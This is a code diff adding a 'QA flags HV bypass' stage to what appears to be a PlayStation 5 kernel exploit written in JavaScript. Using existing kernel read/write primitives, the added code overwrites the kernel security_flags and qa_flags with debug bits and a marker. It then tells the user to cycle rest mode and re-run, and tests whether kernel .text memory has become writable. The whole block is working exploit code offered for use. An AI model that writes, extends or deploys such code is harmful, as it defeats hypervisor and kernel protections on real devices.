@@ -811,6 +811,102 @@ async function main(userlandRW, wkOnly = false) {
             }
 
             // =========================================================================
+            // QA FLAGS HV BYPASS TEST (Byepervisor technique)
+            // =========================================================================
+
+            let qaFlagsTest = confirm(
+                "QA FLAGS HV BYPASS TEST\n\n" +
+                "This implements the Byepervisor technique:\n" +
+                "1. Set SL debug flag in QA flags\n" +
+                "2. Suspend to rest mode\n" +
+                "3. Resume - HV mismatch makes .text writable\n\n" +
+                "After setting flags, you MUST:\n" +
+                "- Put PS5 to REST MODE\n" +
+                "- Wake it up\n" +
+                "- Run exploit again\n\n" +
+                "OK = Set QA flags for HV bypass\n" +
+                "Cancel = Skip"
+            );
+
+            if (qaFlagsTest) {
+                await log("========== QA FLAGS HV BYPASS ==========", LogLevel.SUCCESS);
+
+                // Read current flag values
+                let curSecFlags = await krw.read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
+                let curQaFlags = await krw.read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
+
+                await log("[QA] Current security_flags: 0x" + curSecFlags.toString(16), LogLevel.INFO);
+                await log("[QA] Current qa_flags: 0x" + curQaFlags.toString(16), LogLevel.INFO);
+
+                // Check if we already have the bypass markers set
+                const QA_SL_DEBUG = 0x10000;      // System Level debug flag
+                const QA_KERNEL_DEBUG = 0x8000;   // Kernel debug flag
+                const QA_BYPASS_MARKER = 0xDEAD0000; // Our marker to detect re-run
+
+                let markerSet = (curQaFlags & 0xFFFF0000) === QA_BYPASS_MARKER;
+
+                if (markerSet) {
+                    await log("[QA] Bypass marker detected - checking .text...", LogLevel.SUCCESS);
+
+                    // Try reading .text
+                    try {
+                        let textVal = await krw.read8(krw.ktextBase);
+                        await log("[QA] .text READ SUCCESS: " + textVal, LogLevel.SUCCESS);
+
+                        // Try writing
+                        let textByte = await krw.read1(krw.ktextBase);
+                        await log("[QA] .text byte: 0x" + textByte.toString(16), LogLevel.INFO);
+
+                        try {
+                            await krw.write1(krw.ktextBase, textByte);
+                            await log("[!!!] .TEXT WRITE SUCCEEDED! HV BYPASSED!", LogLevel.SUCCESS);
+                            alert("SUCCESS! QA FLAGS BYPASS WORKED!\n\nKernel .text is now writable!");
+                        } catch (e) {
+                            await log("[QA] .text write failed: " + e, LogLevel.ERROR);
+                            await log("[QA] HV still protecting .text after resume", LogLevel.WARN);
+                        }
+                    } catch (e) {
+                        await log("[QA] .text read failed: " + e, LogLevel.ERROR);
+                    }
+                } else {
+                    await log("[QA] Setting bypass flags...", LogLevel.WARN);
+
+                    // Set various debug flags that might help
+                    // Based on Byepervisor: SL debug flag causes mismatch on resume
+                    let newQaFlags = curQaFlags | QA_SL_DEBUG | QA_KERNEL_DEBUG | QA_BYPASS_MARKER;
+                    let newSecFlags = curSecFlags | 0x14; // Enable debug capabilities
+
+                    await log("[QA] Writing security_flags: 0x" + newSecFlags.toString(16), LogLevel.INFO);
+                    await krw.write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), newSecFlags);
+
+                    await log("[QA] Writing qa_flags: 0x" + newQaFlags.toString(16), LogLevel.INFO);
+                    await krw.write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), newQaFlags);
+
+                    // Verify writes
+                    let verifyQa = await krw.read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
+                    let verifySec = await krw.read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
+
+                    await log("[QA] Verified security_flags: 0x" + verifySec.toString(16), LogLevel.INFO);
+                    await log("[QA] Verified qa_flags: 0x" + verifyQa.toString(16), LogLevel.INFO);
+
+                    await log("[QA] FLAGS SET! Now:", LogLevel.SUCCESS);
+                    await log("[QA] 1. Put PS5 to REST MODE", LogLevel.WARN);
+                    await log("[QA] 2. Wake it up", LogLevel.WARN);
+                    await log("[QA] 3. Run this exploit again", LogLevel.WARN);
+                    await log("[QA] 4. The bypass marker will trigger .text test", LogLevel.WARN);
+
+                    alert(
+                        "QA FLAGS SET!\n\n" +
+                        "Now:\n" +
+                        "1. Put PS5 to REST MODE\n" +
+                        "2. Wake it up\n" +
+                        "3. Run this exploit again\n\n" +
+                        "The exploit will detect the marker and test .text access."
+                    );
+                }
+            }
+
+            // =========================================================================
             // .TEXT WRITE TEST (direct attempt)
             // =========================================================================
 
